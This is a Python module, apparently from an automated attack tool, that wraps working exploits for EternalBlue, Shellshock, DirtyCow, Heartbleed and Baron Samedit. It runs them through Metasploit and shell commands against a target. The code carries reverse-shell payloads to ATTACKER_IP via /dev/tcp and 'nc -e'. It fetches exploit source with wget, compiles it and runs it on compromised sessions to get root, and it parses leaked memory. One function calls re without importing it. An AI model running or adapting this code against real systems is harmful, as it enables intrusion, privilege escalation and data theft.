"""
Binary Exploitation Module
OS-level exploits (EternalBlue, Shellshock, DirtyCow, etc.)
"""

import os
from typing import Dict, List, Optional

class BinaryExploitModule:
    """
    Binary and OS-level exploitation techniques.
    """
    
    def __init__(self):
        self.exploit_db = self._initialize_exploit_database()
    
    def exploit_eternal_blue(self, target_ip: str, callback=None) -> Dict:
        """
        MS17-010 EternalBlue SMB exploit for Windows systems.
        
        Args:
            target_ip: Target Windows system IP
            callback: Optional callback for updates
        
        Returns:
            Exploitation results with session info
        """
        if callback:
            callback({'message': f'ðŸ”¥ Launching EternalBlue (MS17-010) against {target_ip}...'})
        
        results = {
            'success': False,
            'session_id': None,
            'method': 'eternal_blue',
            'cve': 'CVE-2017-0144'
        }
        
        # Check if target is vulnerable
        if callback:
            callback({'message': f'  ðŸ” Checking if {target_ip} is vulnerable to MS17-010...'})
        
        # Use Metasploit's scanner module - REAL EXECUTION
        scan_cmd = f"msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS {target_ip}; run; exit'"
        
        # Execute the actual scanner
        scan_result = self._execute_metasploit_command(scan_cmd, callback)
        
        if scan_result and scan_result.get('vulnerable'):
            if callback:
                callback({'message': f'âœ… Target is vulnerable to EternalBlue!'})
            
            # Launch exploit
            exploit_cmd = f"""msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue;
set RHOSTS {target_ip};
set PAYLOAD windows/x64/meterpreter/reverse_tcp;
set LHOST ATTACKER_IP;
set LPORT 4444;
exploit;
exit'"""
            
            if callback:
                callback({'message': f'  ðŸš€ Executing EternalBlue exploit...'})
            
            exploit_result = self._execute_metasploit_command(exploit_cmd, callback)
            
            if exploit_result and exploit_result.get('session_created'):
                results['success'] = True
                results['session_id'] = exploit_result.get('session_id')
                
                if callback:
                    callback({'message': f'âœ… EternalBlue successful! Meterpreter session {results["session_id"]} opened'})
        else:
            if callback:
                callback({'message': f'âŒ Target not vulnerable to EternalBlue'})
        
        return results
    
    def exploit_shellshock(self, target_url: str, callback=None) -> Dict:
        """
        Bash Shellshock (CVE-2014-6271) exploitation via CGI.
        
        Args:
            target_url: Target URL with CGI-bin
            callback: Optional callback
        
        Returns:
            Exploitation results
        """
        if callback:
            callback({'message': f'ðŸ”¥ Exploiting Shellshock on {target_url}...'})
        
        results = {
            'success': False,
            'method': 'shellshock',
            'cve': 'CVE-2014-6271',
            'rce_achieved': False
        }
        
        # Common CGI paths to test
        cgi_paths = [
            '/cgi-bin/test.cgi',
            '/cgi-bin/status',
            '/cgi-bin/admin.cgi',
            '/cgi-bin/test-cgi',
            '/cgi-mod/index.cgi'
        ]
        
        # Shellshock payloads
        payloads = [
            # Detection payload
            "() { :; }; echo; echo vulnerable",
            
            # Reverse shell payload
            "() { :; }; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            
            # Command execution
            "() { :; }; echo; /usr/bin/id",
            
            # Netcat reverse shell
            "() { :; }; nc -e /bin/bash ATTACKER_IP 4444"
        ]
        
        for cgi_path in cgi_paths:
            full_url = f"{target_url}{cgi_path}"
            
            if callback:
                callback({'message': f'  ðŸ” Testing {cgi_path}...'})
            
            for payload in payloads:
                # Shellshock is triggered via User-Agent or Referer header
                headers = {
                    'User-Agent': payload,
                    'Referer': payload
                }
                
                result = self._send_http_request(full_url, headers, callback)
                
                if result and result.get('vulnerable'):
                    results['success'] = True
                    
                    if 'bash' in payload or 'nc' in payload:
                        results['rce_achieved'] = True
                        
                        if callback:
                            callback({'message': f'âœ… Shellshock RCE successful on {cgi_path}!'})
                    
                    return results
        
        if callback:
            callback({'message': f'âŒ No vulnerable CGI endpoints found'})
        
        return results
    
    def exploit_dirty_cow(self, session_id: str, callback=None) -> Dict:
        """
        CVE-2016-5195 DirtyCow Linux privilege escalation.
        
        Args:
            session_id: Existing session on target
            callback: Optional callback
        
        Returns:
            Exploitation results
        """
        if callback:
            callback({'message': f'ðŸ”¥ Attempting DirtyCow privilege escalation on session {session_id}...'})
        
        results = {
            'success': False,
            'method': 'dirty_cow',
            'cve': 'CVE-2016-5195',
            'root_achieved': False
        }
        
        # Check kernel version first
        from autonomous_session_manager import autonomous_session_manager
        
        kernel_check = autonomous_session_manager._run_command(session_id, 'uname -r', callback)
        
        if kernel_check:
            if callback:
                callback({'message': f'  ðŸ“‹ Kernel version: {kernel_check.strip()}'})
            
            # DirtyCow affects kernels 2.6.22 - 4.8.3
            # This is a simplified check
            if self._is_kernel_vulnerable_to_dirtycow(kernel_check):
                if callback:
                    callback({'message': f'âœ… Kernel appears vulnerable to DirtyCow'})
                
                # Download and compile DirtyCow exploit
                exploit_commands = [
                    # Download exploit
                    'cd /tmp',
                    'wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c -O dirtycow.c 2>/dev/null || curl -o dirtycow.c https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c',
                    
                    # Compile
                    'gcc -pthread dirtycow.c -o dirtycow -lcrypt 2>/dev/null',
                    
                    # Execute
                    './dirtycow password',  # Creates user 'firefart' with password 'password'
                    
                    # Verify
                    'grep firefart /etc/passwd'
                ]
                
                for cmd in exploit_commands:
                    if callback:
                        callback({'message': f'  âš™ï¸ {cmd[:50]}...'})
                    
                    output = autonomous_session_manager._run_command(session_id, cmd, callback)
                    
                    # Check if firefart user was created
                    if output and 'firefart' in output:
                        results['success'] = True
                        results['root_achieved'] = True
                        
                        if callback:
                            callback({'message': f'âœ… DirtyCow successful! Root user "firefart" created (password: password)'})
                        
                        break
            else:
                if callback:
                    callback({'message': f'âŒ Kernel not vulnerable to DirtyCow'})
        
        return results
    
    def exploit_heartbleed(self, target_ip: str, port: int = 443, callback=None) -> Dict:
        """
        CVE-2014-0160 Heartbleed OpenSSL vulnerability.
        
        Args:
            target_ip: Target IP
            port: SSL/TLS port (default 443)
            callback: Optional callback
        
        Returns:
            Exploitation results with leaked memory
        """
        if callback:
            callback({'message': f'ðŸ”¥ Testing Heartbleed on {target_ip}:{port}...'})
        
        results = {
            'success': False,
            'method': 'heartbleed',
            'cve': 'CVE-2014-0160',
            'leaked_data': []
        }
        
        # Use existing Heartbleed scanner/exploit
        scan_cmd = f"nmap -p {port} --script ssl-heartbleed {target_ip}"
        
        scan_result = self._execute_command(scan_cmd, callback)
        
        if scan_result and 'vulnerable' in scan_result.lower():
            if callback:
                callback({'message': f'âœ… Target is vulnerable to Heartbleed!'})
            
            # Extract memory using Heartbleed exploit
            exploit_cmd = f"python heartbleed.py {target_ip} -p {port} -n 10"
            
            exploit_result = self._execute_command(exploit_cmd, callback)
            
            if exploit_result:
                results['success'] = True
                
                # Parse leaked memory for sensitive data
                leaked_data = self._parse_heartbleed_output(exploit_result)
                results['leaked_data'] = leaked_data
                
                if callback:
                    callback({'message': f'âœ… Heartbleed successful! Leaked {len(leaked_data)} memory chunks'})
        else:
            if callback:
                callback({'message': f'âŒ Target not vulnerable to Heartbleed'})
        
        return results
    
    def exploit_sudo_baron_samedit(self, session_id: str, callback=None) -> Dict:
        """
        CVE-2021-3156 Sudo Baron Samedit heap overflow.
        
        Args:
            session_id: Existing session
            callback: Optional callback
        
        Returns:
            Exploitation results
        """
        if callback:
            callback({'message': f'ðŸ”¥ Attempting Sudo Baron Samedit on session {session_id}...'})
        
        results = {
            'success': False,
            'method': 'baron_samedit',
            'cve': 'CVE-2021-3156',
            'root_achieved': False
        }
        
        from autonomous_session_manager import autonomous_session_manager
        
        # Check sudo version
        sudo_version = autonomous_session_manager._run_command(session_id, 'sudo -V | head -1', callback)
        
        if sudo_version and self._is_sudo_vulnerable(sudo_version):
            if callback:
                callback({'message': f'âœ… Sudo version vulnerable: {sudo_version.strip()}'})
            
            # Download exploit
            exploit_commands = [
                'cd /tmp',
                'wget https://github.com/blasty/CVE-2021-3156/raw/main/hax.c 2>/dev/null',
                'gcc -o hax hax.c 2>/dev/null',
                './hax',
                'id'
            ]
            
            for cmd in exploit_commands:
                output = autonomous_session_manager._run_command(session_id, cmd, callback)
                
                if output and 'uid=0' in output:
                    results['success'] = True
                    results['root_achieved'] = True
                    
                    if callback:
                        callback({'message': f'âœ… Baron Samedit successful! Root achieved!'})
                    
                    break
        else:
            if callback:
                callback({'message': f'âŒ Sudo version not vulnerable'})
        
        return results
    
    def _initialize_exploit_database(self) -> Dict:
        """Initialize database of known exploits."""
        return {
            'MS17-010': {
                'name': 'EternalBlue',
                'cve': 'CVE-2017-0144',
                'platform': 'windows',
                'type': 'remote',
                'metasploit': 'exploit/windows/smb/ms17_010_eternalblue'
            },
            'CVE-2014-6271': {
                'name': 'Shellshock',
                'platform': 'linux',
                'type': 'remote',
                'metasploit': 'exploit/multi/http/apache_mod_cgi_bash_env_exec'
            },
            'CVE-2016-5195': {
                'name': 'DirtyCow',
                'platform': 'linux',
                'type': 'local',
                'kernel': '2.6.22 - 4.8.3'
            },
            'CVE-2014-0160': {
                'name': 'Heartbleed',
                'platform': 'any',
                'type': 'remote',
                'service': 'openssl'
            },
            'CVE-2021-3156': {
                'name': 'Baron Samedit',
                'platform': 'linux',
                'type': 'local',
                'sudo_versions': '1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1'
            }
        }
    
    def _execute_metasploit_command(self, cmd: str, callback=None) -> Optional[Dict]:
        """Execute Metasploit command - REAL IMPLEMENTATION."""
        import subprocess
        import re
        
        try:
            # Execute Metasploit command
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300  # 5 minute timeout
            )
            
            output = result.stdout + result.stderr
            
            # Check for vulnerability detection
            if 'appears to be vulnerable' in output.lower() or 'vulnerable' in output.lower():
                vulnerable = True
            else:
                vulnerable = False
            
            # Check for session creation
            session_match = re.search(r'session (\d+) opened', output, re.IGNORECASE)
            if session_match:
                return {
                    'vulnerable': vulnerable,
                    'session_created': True,
                    'session_id': session_match.group(1),
                    'output': output
                }
            
            return {
                'vulnerable': vulnerable,
                'session_created': False,
                'output': output
            }
            
        except subprocess.TimeoutExpired:
            if callback:
                callback({'message': '  âš ï¸ Metasploit command timed out'})
        except Exception as e:
            if callback:
                callback({'message': f'  âš ï¸ Metasploit execution failed: {str(e)[:100]}'})
        
        return None
    
    def _execute_command(self, cmd: str, callback=None) -> Optional[str]:
        """Execute shell command - REAL IMPLEMENTATION."""
        import subprocess
        
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            return result.stdout + result.stderr
            
        except subprocess.TimeoutExpired:
            if callback:
                callback({'message': '  âš ï¸ Command timed out'})
        except Exception as e:
            if callback:
                callback({'message': f'  âš ï¸ Command execution failed: {str(e)[:100]}'})
        
        return None
    
    def _send_http_request(self, url: str, headers: Dict, callback=None) -> Optional[Dict]:
        """Send HTTP request - REAL IMPLEMENTATION."""
        import requests
        
        try:
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            # Check for Shellshock vulnerability indicators
            output = response.text
            
            if 'vulnerable' in output.lower() or 'uid=' in output or 'gid=' in output:
                return {
                    'vulnerable': True,
                    'output': output
                }
            
            return {
                'vulnerable': False,
                'output': output
            }
            
        except Exception as e:
            if callback:
                callback({'message': f'  âš ï¸ HTTP request failed: {str(e)[:100]}'})
        
        return None
    
    def _is_kernel_vulnerable_to_dirtycow(self, kernel_version: str) -> bool:
        """Check if kernel version is vulnerable to DirtyCow - REAL IMPLEMENTATION."""
        import re
        
        try:
            # Extract version number more accurately
            version_match = re.search(r'(\d+)\.(\d+)\.(\d+)', kernel_version)
            if not version_match:
                return False
            
            major = int(version_match.group(1))
            minor = int(version_match.group(2))
            patch = int(version_match.group(3))
            
            # Vulnerable: 2.6.22 <= version <= 4.8.3
            if major == 2:
                if minor > 6 or (minor == 6 and patch >= 22):
                    return True
            elif major == 3:
                return True
            elif major == 4:
                if minor < 8 or (minor == 8 and patch <= 3):
                    return True
            
        except Exception:
            pass
        
        return False
    
    def _is_sudo_vulnerable(self, sudo_version: str) -> bool:
        """Check if sudo version is vulnerable to Baron Samedit - REAL IMPLEMENTATION."""
        import re
        
        # Vulnerable versions: 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
        try:
            # Extract version with patch level
            version_match = re.search(r'(\d+)\.(\d+)\.(\d+)(p\d+)?', sudo_version)
            if version_match:
                major = int(version_match.group(1))
                minor = int(version_match.group(2))
                patch = int(version_match.group(3))
                
                # Check if in vulnerable range
                if major == 1 and minor == 8:
                    if 2 <= patch <= 31:
                        return True
                elif major == 1 and minor == 9:
                    if patch <= 5:
                        return True
        except Exception:
            pass
        
        return False
    
    def _parse_heartbleed_output(self, output: str) -> List[str]:
        """Parse Heartbleed exploit output for leaked data."""
        # Extract memory chunks from output
        chunks = []
        
        # Simple pattern matching for hex dumps
        lines = output.split('\n')
        for line in lines:
            if re.match(r'^[0-9a-f]{4}:', line):
                chunks.append(line)
        
        return chunks[:10]  # Return first 10 chunks

# Singleton instance
binary_exploit_module = BinaryExploitModule()
